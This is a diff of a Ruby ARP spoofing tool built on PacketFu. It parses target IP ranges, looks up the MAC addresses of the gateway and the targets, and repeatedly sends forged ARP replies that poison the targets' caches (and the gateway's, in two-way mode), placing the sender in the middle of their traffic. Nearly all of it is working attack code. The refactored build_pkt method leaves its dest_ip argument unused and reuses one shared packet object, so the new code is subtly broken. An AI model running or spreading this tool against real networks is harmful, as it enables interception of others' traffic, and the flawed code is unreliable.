@@ -51,7 +51,7 @@ else # Parse the command-line options
   end.parse!
 end
 
-#------------------------------------------------------#
+#----------------------------------------------------------------------#
 # Assorted methods
 
 def ip_check(ip)
@@ -68,13 +68,21 @@ def target_parse(target)
   @target = target.select {|ip| ip_check(ip)}           # Move single ips to @target
   target.delete_if {|ip| ip_check(ip)}                  # Leaving range(s) in target
   target.each do |range|                                # Separate range(s) into start and end addresses
-    from 	= range[/\A(\w*.){3}(\w*)/]			
-    to 		= range[/\A(\w*.){3}/] + range.split("-")[1]	
-    ip_from 	= IPAddr.new(from)
-    ip_to 		= IPAddr.new(to)
+    from  = range[/\A(\w*.){3}(\w*)/]     
+    to    = range[/\A(\w*.){3}/] + range.split("-")[1]  
+    ip_from   = IPAddr.new(from)
+    ip_to     = IPAddr.new(to)
     (ip_from..ip_to).each { |ip| @target << ip.to_s }   # Enter each value of range into @target
   end
 end
+  
+def build_pkt(op_code, dest_mac, source_ip, dest_ip)
+  @arp_pkt = PacketFu::ARPPacket.new
+  @arp_pkt.arp_opcode = op_code
+  @arp_pkt.eth_saddr = @arp_pkt.arp_saddr_mac = @defaults[:eth_saddr]
+  @arp_pkt.eth_daddr = @arp_pkt.arp_daddr_mac = dest_mac
+  @arp_pkt.arp_saddr_ip = source_ip
+end 
 
 #------------------------------------------------------#
 # Let's set some defaults and variables
@@ -82,7 +90,7 @@ end
 if interactive
   @verbose = true
 
-  @defaults = PacketFu::Utils.ifconfig
+  @defaults = PacketFu::Utils.ifconfig(Pcap.lookupdev)
   @iface = @defaults[:iface] 
   print "Default interface appears to be #{@iface}.\nEnter to accept #{@iface}, or type an alternative: "
   temp = gets.chomp
@@ -101,7 +109,7 @@ if interactive
     end
     temp = gets.chomp
     @gateway = temp unless temp.empty?
-    if !ip_check(@gateway)
+    unless ip_check(@gateway)
       puts "Invalid IP address. Try again..."
       sleep 1
     end 
@@ -139,11 +147,11 @@ end
 end
 =end
 
-  print "Enter target IP: "
+  print "Enter target IP(s): "
   target = gets.chomp
 
-# CL mode	
-else 	
+# CL mode 
+else  
   @verbose  = options.verbose
   #@smart   = options.smart
   @iface    = options.interface
@@ -158,7 +166,7 @@ var1 = "Smart s"
 else
 var1 = "S"
 end
-=end	
+=end  
 var1 = "S"
     if @gateway
       var2 = "two-way with gateway #{@gateway}."
@@ -181,17 +189,19 @@ var1 = "S"
   end
 end
 
+#----------------------------------------------------------------------#
+
 target_parse(target)
 puts_verbose("\nObtaining mac addresses...")
 @targets_hash = {}
-gateway_mac = PacketFu::Utils::arp(@gateway, :iface => @iface)
-unless gateway_mac 
-  (0..1).map { gateway_mac = PacketFu::Utils::arp(@gateway, :iface => @iface) } # Try twice more, then exit.
+@gateway_mac = PacketFu::Utils::arp(@gateway, :iface => @iface)
+unless @gateway_mac 
+  (0..1).map { @gateway_mac = PacketFu::Utils::arp(@gateway, :iface => @iface) } # Try twice more, then exit.
   puts "Unable to determine gateway mac."
   sleep 2
   exit 0 
 end
-puts_verbose "#{@gateway}: mac is #{gateway_mac} (Gateway)"
+puts_verbose "#{@gateway}: mac is #{@gateway_mac} (Gateway)"
 @target.each do |ip|
   target_mac = PacketFu::Utils::arp(ip, :iface => @iface)
   @targets_hash[ip] = target_mac     # Makes hash of target ips => target macs
@@ -203,31 +213,18 @@ puts_verbose "#{@gateway}: mac is #{gateway_mac} (Gateway)"
 end
 @targets_hash.delete_if { |k, v| v.nil? }
 
-#------------------------------------------------------#
 # Make arrays of packets for targets and gateway
-
+# Args for build_pkt are: op_code, dest_mac, source_ip, dest_ip
 @target_packets  = []
 @gateway_packets = []
 @targets_hash.each do |target, target_mac|
-  arp_packet_target     = PacketFu::ARPPacket.new
-  arp_packet_target.arp_opcode = 2
-  arp_packet_target.eth_saddr = arp_packet_target.arp_saddr_mac = @defaults[:eth_saddr]
-  arp_packet_target.eth_daddr = arp_packet_target.arp_daddr_mac = target_mac
-  arp_packet_target.arp_saddr_ip = @gateway
-  arp_packet_target.arp_daddr_ip = target
-
-  @target_packets << arp_packet_target
+  build_pkt(2, target_mac, @gateway, target)
+  @target_packets << @arp_pkt
 end
 if @two_way
   @targets_hash.each do |target, |
-    arp_pkt_gateway      = PacketFu::ARPPacket.new
-    arp_pkt_gateway.arp_opcode = 2
-    arp_pkt_gateway.eth_saddr = arp_pkt_gateway.arp_saddr_mac = @defaults[:eth_saddr]
-    arp_pkt_gateway.eth_daddr = arp_pkt_gateway.arp_daddr_mac = gateway_mac
-    arp_pkt_gateway.arp_saddr_ip = target
-    arp_pkt_gateway.arp_daddr_ip = @gateway
-
-    @gateway_packets  << arp_pkt_gateway
+    build_pkt(2, @gateway_mac, target, @gateway)
+    @gateway_packets  << @arp_pkt
   end
 end
     
@@ -238,10 +235,13 @@ while send_packets
     @target_packets.each do |pkt|
       pkt.to_w(@iface)
     end
-    @gateway_packets.each do |pkt|
-      pkt.to_w(@iface)
+    if @two_way
+      @gateway_packets.each do |pkt|
+        pkt.to_w(@iface)
+      end
     end
-    GC.start   # to deal with memory leak
+    GC.start   # to deal with "memory leak" (more likely a problem calling GC)
     sleep 1.5
   end
 end
+
